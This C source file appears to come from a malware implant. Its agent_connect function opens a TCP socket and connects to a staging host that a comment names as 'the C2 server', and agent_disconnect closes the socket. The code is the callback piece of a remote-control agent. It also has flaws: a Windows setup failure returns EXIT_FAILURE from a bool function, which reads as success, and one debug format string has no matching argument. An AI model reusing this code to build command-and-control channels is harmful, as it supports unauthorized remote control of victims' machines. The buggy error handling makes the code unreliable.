#ifdef _WIN32
// clang-format off
#include <winsock2.h> // winsock2 needs to be included before windows.h
#include <windows.h>
// clang-format on 
#else
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#endif
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "agent.h"
#include "packet.h"
#include "util.h"

bool agent_connect(agent_t *agent) {
  struct timeval timeout = {
      .tv_sec  = 10,
      .tv_usec = 0,
  };

#ifdef _WIN32
  // apperantly we need this to init winsock
  // "The WSAStartup function initiates use of the Winsock DLL by a process."
  WSADATA wsa_data;
  if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != NO_ERROR) {
    debug("failed to initiate winsock");
    return EXIT_FAILURE;
  }
#endif

  if((agent->socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
    debug("failed to create a socket: %s", strerror(errno));
    return false;
  }

  if (setsockopt(agent->socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
    debug("setsockopt failed for SO_RCVTIMEO: %s", strerror(errno));
    return false;
  }

  if (setsockopt(agent->socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
    debug("setsockopt failed for SO_SNDTIMEO: %s", strerror(errno));
    return false;
  }

  // connect to the C2 server
  struct sockaddr addr;
  bzero(&addr, sizeof(addr));

  if(!resolve(&addr, STAGE_SERVER_HOST, STAGE_SERVER_PORT)){
    debug("failed to resolve %s:%d: %s", STAGE_SERVER_HOST, STAGE_SERVER_PORT);
    goto fail;
  }

  if (connect(agent->socket, &addr, sizeof(addr)) < 0) {
    debug("failed to connect: %s", strerror(errno));
    goto fail;
  }

  return true;
fail:
  agent_disconnect(agent);
  return false;
}

void agent_disconnect(agent_t *agent) {
  if(NULL == agent)
    return;

  close(agent->socket);
  agent->socket = 0;
}
